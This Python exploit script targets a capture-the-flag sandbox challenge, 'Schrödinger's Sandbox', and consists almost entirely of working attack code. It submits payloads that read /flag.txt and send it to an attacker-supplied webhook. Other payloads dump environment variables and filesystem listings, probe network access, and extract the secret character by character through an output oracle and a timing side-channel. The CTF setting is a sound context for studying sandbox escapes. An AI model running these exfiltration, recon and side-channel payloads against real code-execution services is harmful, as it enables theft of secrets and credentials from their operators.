"""
Schrödinger's Sandbox - Best approaches to try

The challenge runs code in two universes (real flag vs fake flag).
Output is only shown if both universes produce identical output.

Approach priority:
1. HTTP exfiltration (if network available)
2. DNS exfiltration (if network available but HTTP blocked)
3. Bit-by-bit oracle via matching output
4. Timing side-channel
"""

import requests
import sys
import time
import string

TARGET = "http://chall.0xfun.org:11102"

def submit(code):
    try:
        r = requests.post(
            f"{TARGET}/api/submit",
            json={"code": code.strip()},
            timeout=15,
        )
        return r.status_code, r.text.strip()
    except Exception as e:
        return None, str(e)


# ============================================================
# APPROACH 1: HTTP exfiltration
# ============================================================
def try_http_exfil(webhook_url):
    """Send flag to external webhook. Both outputs match (empty/static)."""
    code = f"""
import urllib.request
flag = open("/flag.txt").read().strip()
try:
    urllib.request.urlopen(urllib.request.Request(
        "{webhook_url}?" + flag,
        method="GET"
    ), timeout=3)
except:
    pass
print("ok")
"""
    status, text = submit(code)
    print(f"[HTTP exfil] {status}: {text}")


# ============================================================
# APPROACH 2: Env/filesystem recon (both outputs match since
# these are the same in both universes)
# ============================================================
def recon():
    """Gather info about the sandbox environment."""
    code = """
import os, sys
print("Python:", sys.version)
print("CWD:", os.getcwd())
print("UID:", os.getuid() if hasattr(os, 'getuid') else 'N/A')
print("ENV:", dict(os.environ))
try:
    print("Files:", os.listdir("/"))
except:
    pass
try:
    print("Proc:", os.listdir("/proc/self"))
except:
    pass
"""
    status, text = submit(code)
    print(f"[Recon] {status}:\n{text}")


# ============================================================
# APPROACH 3: Check what modules/network are available
# ============================================================
def check_capabilities():
    code = """
import socket, sys
# Check network
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect(("8.8.8.8", 53))
    print("NETWORK: YES")
    s.close()
except Exception as e:
    print(f"NETWORK: NO ({e})")

# Check available modules
for mod in ['urllib', 'urllib.request', 'http', 'subprocess', 'os', 'ctypes', 'socket']:
    try:
        __import__(mod)
        print(f"MODULE {mod}: YES")
    except:
        print(f"MODULE {mod}: NO")
"""
    status, text = submit(code)
    print(f"[Capabilities] {status}:\n{text}")


# ============================================================
# APPROACH 4: Bit-by-bit extraction
# For positions where flags AGREE, we get the output.
# For positions where they DIFFER, we get no output.
# Since real flag = 0xfun{...}, fake flag probably = something else
# with same length. The prefix "0xfun{" and suffix "}" may be same.
# ============================================================
def extract_char_by_char():
    """Extract flag character by character."""
    print("[*] Extracting flag character by character...")

    # Get length first
    status, text = submit('flag = open("/flag.txt").read().strip()\nprint(len(flag))')
    print(f"[*] Length: {text}")

    if not text or not text.strip().isdigit():
        print("[!] Lengths differ between universes")
        # Try range
        for l in range(20, 80):
            code = f'flag = open("/flag.txt").read().strip()\nprint("Y" if len(flag) == {l} else "N")'
            _, t = submit(code)
            if t and "Y" in t:
                flag_len = l
                print(f"[+] Common length: {l}")
                break
        else:
            flag_len = 50
    else:
        flag_len = int(text.strip())

    flag = []
    for pos in range(flag_len):
        # Try each printable char
        found = False
        for c in string.printable.strip():
            code = f"""
f = open("/flag.txt").read().strip()
print("Y" if len(f) > {pos} and f[{pos}] == {repr(c)} else "N")
"""
            _, result = submit(code)
            time.sleep(0.05)

            if result and "Y" in result:
                flag.append(c)
                sys.stdout.write(c)
                sys.stdout.flush()
                found = True
                break

        if not found:
            # Flags differ at this position - we can't get it this way
            # But we know the real flag format: 0xfun{...}
            flag.append("?")
            sys.stdout.write("?")
            sys.stdout.flush()

    print(f"\n\n[*] Result: {''.join(flag)}")
    return "".join(flag)


# ============================================================
# APPROACH 5: Timing side-channel
# Both universes print the same static output.
# Real flag char determines sleep time.
# Measure response time to deduce the character.
# Problem: both run in parallel, so response time = max(both).
# This means timing leaks info about BOTH flags, not just the real one.
# Still useful if we can distinguish.
# ============================================================
def timing_extract():
    """Use timing to extract flag bit by bit."""
    print("[*] Timing-based extraction...")

    flag_len = 50
    flag = []

    for pos in range(flag_len):
        # Binary search for character value
        lo, hi = 32, 126

        while lo < hi:
            mid = (lo + hi) // 2
            code = f"""
import time
flag = open("/flag.txt").read().strip()
if len(flag) > {pos} and ord(flag[{pos}]) > {mid}:
    time.sleep(2)
print("done")
"""
            start = time.time()
            _, result = submit(code)
            elapsed = time.time() - start

            if elapsed > 3:  # One or both slept
                # At least one universe has flag[pos] > mid
                lo = mid + 1
            else:
                hi = mid

            time.sleep(0.05)

        flag.append(chr(lo))
        sys.stdout.write(chr(lo))
        sys.stdout.flush()

    print(f"\n\n[*] Result: {''.join(flag)}")


if __name__ == "__main__":
    print(f"[*] Schrödinger's Sandbox Exploit")
    print(f"[*] Target: {TARGET}\n")

    if len(sys.argv) > 1:
        approach = sys.argv[1]
    else:
        approach = "recon"

    if approach == "recon":
        recon()
    elif approach == "caps":
        check_capabilities()
    elif approach == "http":
        if len(sys.argv) > 2:
            try_http_exfil(sys.argv[2])
        else:
            print("Usage: python exploit_best.py http <webhook_url>")
    elif approach == "bruteforce":
        extract_char_by_char()
    elif approach == "timing":
        timing_extract()
    else:
        print(f"Unknown approach: {approach}")
        print("Options: recon, caps, http, bruteforce, timing")
